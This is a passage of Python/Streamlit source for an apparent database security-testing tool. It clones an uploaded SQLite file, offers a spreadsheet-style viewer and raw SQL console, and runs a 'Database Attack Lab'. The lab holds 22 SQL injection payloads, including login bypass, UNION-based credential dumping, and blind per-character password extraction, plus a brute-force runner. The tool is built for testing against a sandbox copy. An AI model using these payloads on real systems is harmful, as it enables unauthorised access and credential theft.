    job_id = state["job_id"]
    job    = _JOBS.get(job_id, {})
    has_err = "error" in job
    persisted = state.get("clone_result")
    result = job.get("result") or persisted
    if result and not persisted:
        state["clone_result"] = result
    is_ready = bool(result) and not has_err

    # KPI row
    schema = (result or {}).get("schema") or state.get("schema") or []
    total_rows = (result or {}).get("total_rows") or sum(t.get("row_count", 0) for t in schema)
    _db_port_str = str(result.get("host_port","")) if result else ""
    _db_sec = st.session_state.get(f"sec_verdict_{_db_port_str}", "")
    _db_sec_badge = (
        ' <span style="background:#FEF2F2;border:1px solid #DC2626;border-radius:4px;'
        'padding:1px 7px;font-size:0.58rem;color:#DC2626;font-weight:700">🔴 VULNERABLE</span>'
        if _db_sec == "VULNERABLE" else (
        ' <span style="background:#F0FDF4;border:1px solid #16A34A;border-radius:4px;'
        'padding:1px 7px;font-size:0.58rem;color:#16A34A;font-weight:700">🟢 SECURED</span>'
        if _db_sec == "SECURED" else "")
    )
    status_badge = (
        f'<span class="dt-pro-badge live"><span class="dot"></span>LIVE :{result.get("host_port","?")}</span>'
        + _db_sec_badge
        if is_ready and result.get("ready") else
        f'<span class="dt-pro-badge warn"><span class="dot"></span>DEPLOYING</span>'
    )
    st.markdown(
        _sec_header("docker", "Database Twin", status_badge), unsafe_allow_html=True
    )
    st.markdown(f"""
<div class="dt-kpis">
  <div class="dt-kpi"><div class="dt-kpi-val">{len(schema)}</div><div class="dt-kpi-lbl">Tables</div></div>
  <div class="dt-kpi"><div class="dt-kpi-val">{total_rows:,}</div><div class="dt-kpi-lbl">Total Rows</div></div>
  <div class="dt-kpi"><div class="dt-kpi-val" style="font-size:.95rem">{state['filename'][:22]}</div><div class="dt-kpi-lbl">Database File</div></div>
</div>""", unsafe_allow_html=True)

    col_schema, col_live = st.columns([1, 2], gap="medium")

    # ── Left: schema explorer ─────────────────────────────────────
    with col_schema:
        st.markdown(
            '<div class="dt-tree-hdr">'
            '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>'
            'Schema · tables</div>',
            unsafe_allow_html=True,
        )
        if schema:
            for t in schema:
                st.markdown(
                    f'<div style="background:#FFFFFF;border:1px solid #E0F2FE;border-left:3px solid #0284C7;'
                    f'border-radius:6px;padding:9px 12px;margin-bottom:6px;">'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.78rem;color:#0C4A6E;font-weight:700;">'
                    f'🗄️ {t["name"]}</div>'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.64rem;color:#64748B;margin-top:3px;">'
                    f'{t["column_count"]} cols · {t["row_count"]:,} rows</div>'
                    f'</div>',
                    unsafe_allow_html=True,
                )
        else:
            st.caption("Reading schema…")

    # ── Right: progress + live preview ────────────────────────────
    with col_live:
        _render_clone_progress(job, has_err)
        if is_ready and result:
            _render_preview(result)

    # ── Security scan (reuse the database_scanner on the file) ────
    if is_ready:
        with st.expander("🔬 Security scan of this database", expanded=False):
            try:
                from core.database_scanner import scan_sqlite
                rep = scan_sqlite(state["db_path"])
                findings = rep.get("findings", [])
                if findings:
                    st.markdown(f"**{len(findings)} findings** — sample below:")
                    for f in findings[:15]:
                        sev = f.get("severity", "LOW")
                        col = {"CRITICAL": "#DC2626", "HIGH": "#D97706",
                               "MEDIUM": "#0284C7", "LOW": "#16A34A"}.get(sev, "#64748B")
                        st.markdown(
                            f'<div style="border-left:3px solid {col};padding:6px 10px;margin:4px 0;'
                            f'background:#F8FBFF;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:0.72rem;">'
                            f'<b style="color:{col}">[{sev}] {f.get("category","")}</b> · '
                            f'{f.get("table","")}.{f.get("column","")} row {f.get("row_id","")}</div>',
                            unsafe_allow_html=True,
                        )
                else:
                    st.success("No stored-content threats detected in this database.")
            except Exception as e:
                st.info(f"Scan unavailable: {e}")

    # ── v29: EXCEL-LIKE DATA VIEWER + SQL EDITOR ────────────────────
    # Picks a table from schema, loads with sqlite3, displays in
    # st.data_editor (Excel-style grid). Below: SQL console — type
    # query → run → results in second grid. Same shape as MySQL
    # Workbench / DBeaver's table editor.
    if is_ready and schema:
        st.html(
            '<div style="background:linear-gradient(135deg,#ECFDF5,#F0FDF4);'
            'border:1.5px solid #6EE7B7;border-radius:11px;padding:11px 14px;'
            'margin:14px 0 8px;box-shadow:0 2px 8px -3px rgba(16,185,129,0.15)">'
            '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
            'color:#047857;letter-spacing:0.02em">'
            '📊 EXCEL-STYLE DATA VIEWER &middot; SQL EDITOR'
            '</div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#065F46;'
            'margin-top:3px">Browse table rows like a spreadsheet, or run raw SQL — '
            'changes are persisted to the live twin database.</div>'
            '</div>'
        )
        try:
            # v34-fix: pure-sqlite3, no pandas. User's AppLocker blocks
            # pandas_parser DLL — and pandas was only used for read_sql/
            # to_sql round-trips that sqlite3 can do natively. st.dataframe
            # accepts list-of-dicts directly so we save the dep entirely.
            import sqlite3

            def _fetch_rows(con, sql: str, params=()) -> tuple[list[str], list[dict]]:
                """Return (column_names, list_of_dicts) for any SELECT."""
                cur = con.execute(sql, params)
                cols = [d[0] for d in (cur.description or [])]
                rows = [dict(zip(cols, r)) for r in cur.fetchall()]
                return cols, rows

            _table_names = [t["name"] for t in schema]
            _tc1, _tc2 = st.columns([1.5, 4])
            with _tc1:
                _picked = st.selectbox(
                    "Table",
                    _table_names,
                    key="db_excel_table",
                    label_visibility="collapsed",
                )
            with _tc2:
                _ml = st.slider(
                    "Rows to show",
                    min_value=10, max_value=500, value=100, step=10,
                    key="db_excel_limit",
                    label_visibility="collapsed",
                )

            # Load chosen table — sqlite3 native, no pandas
            _con = sqlite3.connect(state["db_path"])
            _cols, _rows = _fetch_rows(
                _con, f'SELECT * FROM "{_picked}" LIMIT ?', (int(_ml),)
            )
            st.html(
                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
                f'color:#475569;margin:6px 0 3px">'
                f'🗄 <b style="color:#047857">{_picked}</b> &middot; showing '
                f'{len(_rows)} of <b>{next((t["row_count"] for t in schema if t["name"]==_picked), 0):,}</b> rows '
                f'&middot; <span style="color:#94A3B8">edit cells directly — '
                f'click "Save edits" to write back</span></div>'
            )
            # st.data_editor accepts list-of-dicts directly — pandas-free path
            _edited = st.data_editor(
                _rows,
                use_container_width=True,
                num_rows="dynamic",
                key=f"db_excel_editor_{_picked}",
                height=320,
            )
            _save_c1, _save_c2 = st.columns([1, 4])
            with _save_c1:
                if st.button("💾 Save edits", key=f"db_excel_save_{_picked}",
                              type="primary", use_container_width=True):
                    try:
                        # Replace table content via pure sqlite3 — preserves
                        # schema via the original CREATE statement, just
                        # truncates and re-inserts the edited rows.
                        _tname = _picked.replace('"', '""')
                        _con.execute(f'DELETE FROM "{_tname}"')
                        if _edited:
                            _ecols = list(_edited[0].keys())
                            _ph = ",".join("?" * len(_ecols))
                            _qcols = ",".join(f'"{c}"' for c in _ecols)
                            _con.executemany(
                                f'INSERT INTO "{_tname}" ({_qcols}) VALUES ({_ph})',
                                [tuple(r.get(c) for c in _ecols) for r in _edited],
                            )
                        _con.commit()
                        st.success(f"Saved {len(_edited)} rows to {_picked}")
                    except Exception as _se:
                        st.error(f"Save failed: {_se}")
            with _save_c2:
                st.markdown(
                    '<div style="padding-top:9px;font-family:Inter,sans-serif;'
                    'font-size:0.66rem;color:#64748B">'
                    'Save replaces the table — changes also appear in sqlite-web iframe above.'
                    '</div>', unsafe_allow_html=True,
                )

            # ── SQL editor below ──
            st.html(
                '<div style="font-family:Inter,sans-serif;font-size:0.72rem;'
                'font-weight:700;color:#0F172A;margin:14px 0 4px;'
                'letter-spacing:0.02em">💻 RAW SQL CONSOLE</div>'
            )
            _sql = st.text_area(
                "SQL",
                value=f'SELECT *\nFROM "{_picked}"\nLIMIT 20;',
                height=110,
                key="db_excel_sql",
                label_visibility="collapsed",
            )
            _rc1, _rc2 = st.columns([1, 4])
            with _rc1:
                _run_sql = st.button("⚡ Run SQL", key="db_excel_run",
                                     type="primary", use_container_width=True)
            with _rc2:
                st.markdown(
                    '<div style="padding-top:9px;font-family:JetBrains Mono,monospace;'
                    'font-size:0.62rem;color:#64748B">SELECT / INSERT / UPDATE / DELETE all run '
                    'against the live twin — no host DB is touched.</div>',
                    unsafe_allow_html=True,
                )
            if _run_sql and _sql.strip():
                try:
                    _stmt = _sql.strip().split()[0].upper()
                    if _stmt == "SELECT":
                        _scols, _srows = _fetch_rows(_con, _sql)
                        st.html(
                            f'<div style="font-family:JetBrains Mono,monospace;'
                            f'font-size:0.62rem;color:#16A34A;margin:6px 0 3px">'
                            f'✓ {len(_srows)} rows returned</div>'
                        )
                        st.dataframe(_srows, use_container_width=True, height=300)
                    else:
                        _cur = _con.cursor()
                        _cur.execute(_sql)
                        _con.commit()
                        st.html(
                            f'<div style="background:#ECFDF5;border:1px solid #6EE7B7;'
                            f'border-radius:6px;padding:7px 11px;margin-top:6px;'
                            f'font-family:Inter,sans-serif;font-size:0.7rem;color:#047857">'
                            f'✓ {_stmt} executed &middot; '
                            f'{_cur.rowcount} row(s) affected</div>'
                        )
                except Exception as _qe:
                    st.html(
                        f'<div style="background:#FEF2F2;border:1px solid #FCA5A5;'
                        f'border-radius:6px;padding:7px 11px;margin-top:6px;'
                        f'font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#991B1B">'
                        f'✗ SQL error: {str(_qe).replace("<","&lt;").replace(">","&gt;")}</div>'
                    )
            _con.close()
        except Exception as _xe:
            st.warning(f"Excel viewer unavailable: {_xe}")

    # ── v30: UNIFIED RECOMMENDATIONS strip for DB Twin ──────────────
    # Same visual language as the Code Clone recommendation panel — so
    # users see the SAME pattern across all 3 tabs.
    if is_ready and schema:
        # v34-fix: get_sqlite_schema returns columns as list[str] (just
        # column names), not list[dict]. Defensive: handle both shapes.
        def _col_name(col):
            if isinstance(col, dict):
                return (col.get("name") or "").lower()
            return str(col).lower()
        _has_pii = any(
            any(c in _col_name(col)
                for c in ("email", "password", "ssn", "card", "phone"))
            for t in schema for col in (t.get("columns") or [])
        )
        _row_total = sum(t.get("row_count", 0) for t in schema)
        st.html(
            '<div style="background:linear-gradient(135deg,#FAF5FF,#EFF6FF);'
            'border:1.5px solid #C7D2FE;border-radius:11px;padding:11px 14px;'
            'margin:14px 0 8px;box-shadow:0 2px 8px -3px rgba(99,102,241,0.15)">'
            '<div style="display:flex;align-items:center;justify-content:space-between;'
            'margin-bottom:6px;gap:10px">'
            '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
            'color:#4338CA;letter-spacing:0.02em">'
            '🎯 RECOMMENDED FOR THIS DATABASE'
            '</div>'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
            f'font-weight:700;color:#4338CA;background:#FFFFFF;border:1px solid #C7D2FE;'
            f'padding:3px 9px;border-radius:6px">'
            f'{len(schema)} tables · {_row_total:,} rows</span>'
            '</div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#4338CA;'
            'line-height:1.55">'
            + ('⚡ <b>HIGH PRIORITY</b> — schema contains PII-like columns '
                '(email/password/card). Run SQL injection + SELECT-based exfil tests. '
                if _has_pii else
                '✓ No PII-shaped columns detected — still recommend basic SQLi + '
                'auth-bypass checks to verify query parameterisation.'
              ) +
            '</div>'
            '</div>'
        )

    # ── Live Attack Lab — REAL SQLi/XSS/priv-esc against the twin ──
    if is_ready:
        _render_db_attack_lab(state, result)

        # ── v30: Next-Step bar for DB Twin (same pattern as Code Clone) ──
        st.html(
            '<div style="background:linear-gradient(135deg,#EFF6FF,#F0FDF4);'
            'border:1.5px solid #93C5FD;border-radius:11px;padding:11px 14px;'
            'margin:12px 0 6px;box-shadow:0 2px 8px -3px rgba(59,130,246,0.18)">'
            '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
            'color:#1E40AF;letter-spacing:0.02em">'
            '✅ DB TWIN READY — WHAT NEXT?</div>'
            '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#1E40AF;'
            'margin-top:3px;line-height:1.5">'
            'Inspect data in the Excel viewer · run the attack lab · download the '
            'forensic JSON · or destroy the twin to wipe everything.'
            '</div>'
            '</div>'
        )

    # ── Downloads + destroy ───────────────────────────────────────
    if is_ready and result:
        dc1, dc2, dc3 = st.columns(3)
        with dc1:
            # Current twin .db (includes any attack mutations — the "live state")
            try:
                with open(state["db_path"], "rb") as fh:
                    db_bytes = fh.read()
                st.download_button(
                    "⬇ Twin DB (.sqlite)",
                    data=db_bytes,
                    file_name=f"twin_{state['filename']}",
                    mime="application/x-sqlite3",
                    key="dt_db_dl_twin",
                    type="primary",
                    use_container_width=True,
                    help="Current twin state — includes any attack-lab changes",
                )
            except Exception:
                st.caption("Twin export unavailable")
        with dc2:
            # Forensic JSON: schema + scan findings + attack log
            try:
                from core.database_scanner import scan_sqlite
                scan = scan_sqlite(state["db_path"])
            except Exception:
                scan = {}
            report = {
                "twin_id":   result.get("twin_id"),
                "filename":  state["filename"],
                "schema":    state.get("schema") or [],
                "scan":      scan,
                "attacks":   state.get("db_attack_log", []),
            }
            rj = json.dumps(report, indent=2, default=str).encode("utf-8")
            st.download_button(
                "⬇ Forensic JSON",
                data=rj,
                file_name=f"db_report_{int(time.time())}.json",
                mime="application/json",
                key="dt_db_dl_json",
                use_container_width=True,
            )
        with dc3:
            if st.button("🗑 Destroy Twin", key="dt_db_destroy",
                         type="secondary", use_container_width=True):
                try:
                    from core.database_twin import destroy_database_twin
                    destroy_database_twin(result.get("twin_id", ""))
                except Exception:
                    pass
                st.session_state.pop("dt_state", None)
                st.session_state.pop("dt_uploaded_name", None)
                st.rerun()

    # Auto-refresh while building
    if not is_ready and not has_err:
        time.sleep(0.4)


# ─────────────────────────────────────────────────────────────────────
#  DATABASE ATTACK LAB UI
# ─────────────────────────────────────────────────────────────────────
def _db_snap_table_html(snap: dict) -> str:
    """Render a tiny BEFORE/AFTER row preview table."""
    if not snap or snap.get("error"):
        return f'<div style="font-family:JetBrains Mono,monospace;font-size:.66rem;color:#94A3B8">snapshot unavailable: {(snap or {}).get("error","")}</div>'
    cols = snap.get("columns", [])
    rows = snap.get("rows", [])
    if not cols:
        return f'<div style="font-family:JetBrains Mono,monospace;font-size:.66rem;color:#94A3B8">empty table</div>'
    th = "".join(f'<th style="padding:4px 8px;text-align:left;font-size:.6rem;color:#0284C7;text-transform:uppercase;letter-spacing:.08em;background:#F0F9FF;border-bottom:1px solid #BAE6FD">{c}</th>' for c in cols[:5])
    body = ""
    for r in rows[:4]:
        tds = ""
        for v in r[:5]:
            s = str(v) if v is not None else "—"
            s = s.replace("<", "&lt;").replace(">", "&gt;")[:46]
            tds += f'<td style="padding:5px 8px;font-size:.66rem;color:#0F172A;border-bottom:1px solid #F0F9FF;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:160px">{s}</td>'
        body += f'<tr>{tds}</tr>'
    return (
        '<div style="background:#FFFFFF;border:1px solid #E0F2FE;border-radius:6px;overflow:auto;font-family:JetBrains Mono,monospace;max-height:160px">'
        '<table style="border-collapse:collapse;width:100%"><thead><tr>' + th + '</tr></thead>'
        '<tbody>' + body + '</tbody></table>'
        f'<div style="padding:4px 10px;font-size:.6rem;color:#64748B;background:#F8FBFF;border-top:1px solid #E0F2FE">{snap.get("count",0)} row(s) total in {snap.get("table","?")}</div></div>'
    )


def _db_attack_event_html(ev: dict) -> str:
    """One attack-event line + optional snapshot + optional SQL."""
    color_map = {
        "crit": ("#B91C1C", "#DC2626", "#FEF2F2"),
        "ok":   ("#15803D", "#16A34A", "#F0FDF4"),
        "warn": ("#B45309", "#D97706", "#FFFBEB"),
        "info": ("#0369A1", "#0284C7", "#F0F9FF"),
    }
    fg, bd, bg = color_map.get(ev.get("status", "info"), color_map["info"])
    phase_label = {
        "setup": "SETUP", "before": "BEFORE", "execute": "EXEC",
        "after": "AFTER", "verify": "VERIFY", "summary": "DONE",
    }.get(ev.get("phase", ""), ev.get("phase", "").upper())
    text = (ev.get("text", "") or "").replace("<", "&lt;").replace(">", "&gt;")
    sql = ev.get("sql", "")
    sql_html = ""
    if sql:
        sql_safe = sql.replace("<", "&lt;").replace(">", "&gt;")
        sql_html = (
            f'<div style="margin-top:5px;margin-left:62px;padding:6px 10px;background:#0F172A;color:#7DD3FC;'
            f'border-radius:5px;font-family:JetBrains Mono,monospace;font-size:.66rem;'
            f'overflow:auto;white-space:pre-wrap"><span style="color:#A78BFA">sqlite&gt;</span> {sql_safe}</div>'
        )
    snap_html = ""
    if ev.get("snapshot"):
        snap_html = f'<div style="margin-top:6px;margin-left:62px">{_db_snap_table_html(ev["snapshot"])}</div>'
    return (
        f'<div style="border-left:3px solid {bd};background:{bg};border-radius:6px;'
        f'padding:7px 12px;margin-bottom:6px">'
        f'<div style="display:flex;align-items:center;gap:10px">'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:.58rem;font-weight:700;color:{fg};'
        f'background:#FFFFFF;border:1px solid {bd}55;border-radius:10px;padding:2px 8px;'
        f'flex-shrink:0;letter-spacing:.06em;min-width:54px;text-align:center">{phase_label}</span>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:.76rem;color:{fg};font-weight:600">{text}</span>'
        f'</div>'
        f'{sql_html}{snap_html}</div>'
    )


def _render_db_attack_lab(state: dict, result: dict) -> None:
    """Wired UI for core.database_attack_lab — light Arctic Frost theme."""
    from core.database_attack_lab import ATTACKS, run_db_attack
    st.markdown(_sec_header("attack", "Database Attack Lab"), unsafe_allow_html=True)
    st.markdown(
        '<div style="background:linear-gradient(135deg,#F0F9FF,#E0F2FE);border:1px solid #BAE6FD;'
        'border-radius:12px;padding:14px 18px;margin-bottom:16px;">'
        '<div style="font-family:Inter,sans-serif;font-size:0.86rem;color:#0C4A6E;font-weight:700;">'
        '🧬 Real SQL / XSS / privilege-escalation attacks against the LIVE twin DB</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#475569;margin-top:5px;line-height:1.6;">'
        'Each attack runs real SQL on the twin copy &amp; captures the before/after table state. '
        '<b>Your original .db on disk is never touched</b> — the twin is the sandbox copy.</div>'
        '</div>',
        unsafe_allow_html=True,
    )
    cards = list(ATTACKS.items())
    cols = st.columns(len(cards))
    for col, (key, spec) in zip(cols, cards):
        with col:
            st.markdown(
                f'<div class="dt-atk-card" style="border-color:{spec["border"]};background:{spec["bg"]};min-height:140px">'
                f'<div class="dt-atk-icon">{spec["icon"]}</div>'
                f'<div class="dt-atk-lbl" style="color:{spec["color"]}">{spec["label"]}</div>'
                f'<div class="dt-atk-desc">{spec["desc"]}</div>'
                '</div>',
                unsafe_allow_html=True,
            )
            if st.button("Run attack", key=f"dba_{key}", use_container_width=True):
                _run_db_attack(key, state, result)

    # v35: Industry-grade SQLi attack console — 3 pattern categories +
    # configurable brute-force runner + CMD-style terminal.
    _render_sqli_attack_console(state, result)


# v35: SQL Injection payload library — 3 industry-standard categories
# Each entry: (id, label, payload, expected_signal, description)
_SQLI_PAYLOADS = {
    "tautology": [
        ("taut01",  "Classic OR 1=1",        "' OR 1=1 --",
            "row_count_inflated",
            "Forces WHERE clause TRUE for every row — bypasses any login form's filter"),
        ("taut02",  "OR a=a",                "' OR 'a'='a",
            "row_count_inflated",
            "String-based tautology — works when input is quote-wrapped"),
        ("taut03",  "Comment-out password",  "admin' --",
            "auth_bypass",
            "Closes username quote then comments out the password check"),
        ("taut04",  "Hash-comment bypass",   "admin' #",
            "auth_bypass",
            "MySQL-flavour comment — equivalent to -- but shorter"),
        ("taut05",  "Always-true UNION",     "' OR 1=1 UNION SELECT NULL --",
            "row_count_inflated",
            "Tautology + UNION nullification — tests join-aware filters"),
        ("taut06",  "Boolean math",          "' OR 2*3=6 --",
            "row_count_inflated",
            "WAF bypass — uses arithmetic instead of explicit '1=1'"),
        ("taut07",  "Cast int",              "' OR CAST(1 AS INTEGER)=1 --",
            "row_count_inflated",
            "Sneaks past basic regex filters watching for '1=1'"),
        ("taut08",  "Concat injection",      "' OR ''='",
            "row_count_inflated",
            "Empty-string equality — universal SQL truism"),
    ],
    "union": [
        ("uni01",  "Reveal table names",
            "' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --",
            "schema_leaked",
            "Pulls schema metadata via UNION — first step in any DB recon"),
        ("uni02",  "Dump all columns",
            "' UNION SELECT sql, NULL FROM sqlite_master WHERE type='table' --",
            "schema_leaked",
            "Pulls CREATE TABLE statements — reveals every column + type"),
        ("uni03",  "Exfiltrate user rows",
            "' UNION SELECT username || ':' || password, NULL FROM users --",
            "credential_leak",
            "Common credential exfil — concatenates username/password into one column"),
        ("uni04",  "Hex-encode bypass",
            "' UNION SELECT hex(password), NULL FROM users --",
            "credential_leak",
            "Hex-encodes binary blobs so they're recoverable from text logs"),
        ("uni05",  "Stack rows by ID",
            "' UNION SELECT 1, id FROM users ORDER BY id DESC LIMIT 1 --",
            "schema_leaked",
            "Finds the highest user ID — useful for enumeration"),
        ("uni06",  "Reveal SQLite version",
            "' UNION SELECT sqlite_version(), NULL --",
            "schema_leaked",
            "Fingerprints the DB engine — tailors next-stage payloads"),
        ("uni07",  "Multi-column dump",
            "' UNION SELECT name, sql FROM sqlite_master --",
            "credential_leak",
            "Two-column dump — table names + full CREATE statements"),
    ],
    "blind_time": [
        ("blind01", "OR 1=1 (no echo)",
            "' OR 1=1 --",
            "blind_truthy",
            "Blind tautology — no error / no echo, just behaviour difference"),
        ("blind02", "Substring probe",
            "' OR SUBSTR((SELECT password FROM users WHERE id=1),1,1)='a' --",
            "blind_truthy",
            "Per-character credential extraction — slow but deadly accurate"),
        ("blind03", "Length probe",
            "' OR (SELECT LENGTH(password) FROM users WHERE id=1) > 8 --",
            "blind_truthy",
            "Reveals exact password length — first step before substring extraction"),
        ("blind04", "Conditional row leak",
            "' OR (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='a') --",
            "blind_truthy",
            "Boolean-blind exfil — leaks each password character one at a time"),
        ("blind05", "Heavy query timing",
            "' OR (SELECT count(*) FROM users a, users b, users c, users d) > 0 --",
            "blind_time",
            "Time-based — heavy cross-join takes seconds, distinguishable from baseline"),
        ("blind06", "Boolean comparison",
            "' AND 1=1 --",
            "blind_truthy",
            "Tests if the injection point reacts to TRUE vs FALSE conditions"),
        ("blind07", "Negation test",
            "' AND 1=2 --",
            "blind_falsy",
            "Companion to blind06 — should suppress all results, proving injection works"),
    ],
}

_CATEGORY_META = {
    "tautology":  {"label": "🟦 TAUTOLOGY",  "color": "#0284C7",
                    "bg": "#F0F9FF", "border": "#7DD3FC",
                    "desc": "WHERE clause always-true · bypasses login forms"},
    "union":      {"label": "🟪 UNION-BASED", "color": "#7C3AED",
                    "bg": "#FAF5FF", "border": "#DDD6FE",
                    "desc": "Combine UNION SELECT to exfiltrate other tables"},
    "blind_time": {"label": "🟧 BLIND / TIME", "color": "#EA580C",
                    "bg": "#FFF7ED", "border": "#FDBA74",
                    "desc": "No echo — infer via row count or response time"},
}


def _render_sqli_attack_console(state: dict, result: dict) -> None:
    """v35: Industry-grade SQLi attack console.

    Three SQLi pattern categories (8 + 7 + 7 = 22 real payloads), a CMD-style
    terminal for manual SQL, and a brute-force runner that fires a configurable
    number of attempts (up to 1000) tracking success / failure per payload.

    All queries execute against the LIVE TWIN sqlite file (state["db_path"]),
    never the user's original disk file. Read-only sessions for safety unless
    user explicitly enables write mode.
    """
    import sqlite3
    db_path = state.get("db_path")
    if not db_path:
        st.info("Deploy the database twin first to enable the attack console.")
        return

    st.html(
        '<div style="background:linear-gradient(135deg,#0F172A,#1E293B);'
        'border:1px solid #334155;border-radius:12px;padding:14px 18px;'
        'margin:18px 0 12px;box-shadow:0 4px 18px -8px rgba(15,23,42,0.5)">'
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'gap:10px;margin-bottom:6px">'
        '<div style="font-family:JetBrains Mono,monospace;font-size:0.92rem;'
        'color:#22D3EE;font-weight:800;letter-spacing:0.06em">'
        '💉 SQLi ATTACK CONSOLE · industry-grade payload library'
        '</div>'
        '<span style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
        'color:#22D3EE;background:#0E7490;border:1px solid #06B6D4;'
        'border-radius:5px;padding:3px 9px;letter-spacing:0.12em">v35</span>'
        '</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.7rem;color:#94A3B8;'
        'line-height:1.6">22 real payloads across 3 industry-standard '
        'categories (tautology · UNION-based · blind/time) · CMD-style terminal · '
        'brute-force runner (up to 1000 attempts) · all isolated to the twin DB.</div>'
        '</div>'
    )

    # ── Tabs for the three modes ──
    _tab_lib, _tab_brute, _tab_cmd = st.tabs([
        "📚 Pattern Library",
        "⚡ Brute Force (up to 1000)",
        "💻 CMD Terminal",
    ])

    # ── TAB 1: Pattern Library ──────────────────────────────────────
    with _tab_lib:
        _cat = st.radio(
            "Category",
            options=list(_CATEGORY_META.keys()),
            format_func=lambda k: _CATEGORY_META[k]["label"],
            horizontal=True,
            key="sqli_cat_pick",
            label_visibility="collapsed",
        )
        _meta = _CATEGORY_META[_cat]
        st.html(
            f'<div style="background:{_meta["bg"]};border:1px solid {_meta["border"]};'
            f'border-left:4px solid {_meta["color"]};border-radius:8px;'
            f'padding:9px 13px;margin:8px 0">'
            f'<b style="color:{_meta["color"]};font-family:Inter,sans-serif;'
            f'font-size:0.78rem">{_meta["label"]}</b>'
            f'<span style="font-family:Inter,sans-serif;font-size:0.68rem;'
            f'color:#475569;margin-left:8px">{_meta["desc"]}</span>'
            f'</div>'
        )
        for pid, label, payload, signal, desc in _SQLI_PAYLOADS[_cat]:
            with st.expander(f"{label}  ·  {desc[:60]}…"):
                st.code(payload, language="sql")
                if st.button(f"▶ Run this payload", key=f"sqli_run_{pid}",
                              use_container_width=True):
                    _run_single_sqli_payload(db_path, pid, label, payload,
                                              signal, state)
                # Show result if already run
                _last = state.get(f"sqli_result_{pid}")
                if _last:
                    _ok_c  = "#16A34A" if _last["success"] else "#DC2626"
                    _ok_lb = "✓ INJECTION SUCCEEDED" if _last["success"] else "✗ payload rejected"
                    st.html(
                        f'<div style="background:#FFFFFF;border:1px solid {_ok_c}55;'
                        f'border-left:3px solid {_ok_c};border-radius:6px;padding:7px 11px;'
                        f'margin-top:6px;font-family:JetBrains Mono,monospace;'
                        f'font-size:0.66rem;color:{_ok_c};font-weight:700">'
                        f'{_ok_lb} · {_last["rows"]} row(s) returned · '
                        f'{_last["ms"]:.1f}ms'
                        f'</div>'
                    )

    # ── TAB 2: Brute-Force Runner ───────────────────────────────────
    with _tab_brute:
        st.html(
            '<div style="font-family:Inter,sans-serif;font-size:0.78rem;color:#0F172A;'
            'line-height:1.6;margin-bottom:8px">'
            '<b>Fires N attempts sequentially</b>, cycling through all 22 payloads '
            'across all 3 categories. Tracks per-payload success rate, response '
            'time histogram, and credential leakage. Industry-realistic profile — '
            'matches what sqlmap / Acunetix do as a baseline scan.'
            '</div>'
        )
        _bc1, _bc2 = st.columns([1, 2])
        with _bc1:
            _attempts = st.select_slider(
                "Attempts",
                options=[10, 50, 100, 250, 500, 1000],
                value=100,
                key="sqli_brute_n",
            )
        with _bc2:
            st.html(
                f'<div style="padding-top:9px;font-family:JetBrains Mono,monospace;'
                f'font-size:0.66rem;color:#64748B">Will fire {_attempts} payloads · '
                f'expected wall time ≈ {_attempts * 8 // 1000}s (sqlite is fast)</div>'
            )
        if st.button(f"⚡ FIRE {_attempts}-ATTEMPT BRUTE-FORCE",
                      key="sqli_brute_go", type="primary",
                      use_container_width=True):
            _run_brute_force(db_path, _attempts, state)
        # Display saved results
        if state.get("sqli_brute_result"):
            _render_brute_force_report(state["sqli_brute_result"])

    # ── TAB 3: CMD Terminal ─────────────────────────────────────────
    with _tab_cmd:
        st.html(
            '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#0F172A;'
            'margin-bottom:6px">Type a SQL command — runs against the live twin. '
            'Read-only by default; tick "write mode" for INSERT/UPDATE/DELETE.</div>'
        )
        _wm = st.checkbox("✏ Allow write mode (INSERT/UPDATE/DELETE/DROP)",
                          key="sqli_cmd_write", value=False,
                          help="Enable to test destructive queries. Twin only — host DB untouched.")
        _cmd = st.text_input(
            "SQL prompt",
            value=state.get("sqli_cmd_last", "SELECT name FROM sqlite_master WHERE type='table';"),
            key="sqli_cmd_input",
            placeholder="sql>",
            label_visibility="collapsed",
        )
        if st.button("▶ Execute", key="sqli_cmd_exec",
                      type="primary", use_container_width=True):
            _exec_cmd_terminal(db_path, _cmd, _wm, state)
        # Render history (most recent first)
        for entry in (state.get("sqli_cmd_history") or [])[:20]:
            _verdict_c = "#16A34A" if entry["ok"] else "#DC2626"
            st.html(
                f'<div style="background:#0F172A;border:1px solid #1E3A5F;'
                f'border-left:3px solid {_verdict_c};border-radius:7px;'
                f'padding:9px 12px;margin-bottom:6px;'
                f'font-family:JetBrains Mono,monospace">'
                f'<div style="display:flex;justify-content:space-between;'
                f'align-items:center;font-size:0.6rem;color:#94A3B8;margin-bottom:4px">'
                f'<span><span style="color:#22D3EE">sql&gt;</span> {entry["t"]}</span>'
                f'<span style="color:{_verdict_c}">'
                f'{("✓" if entry["ok"] else "✗")} {entry["rows"]} row(s) · '
                f'{entry["ms"]:.1f}ms</span>'
                f'</div>'
                f'<pre style="margin:4px 0 0;padding:7px 10px;background:#020617;'
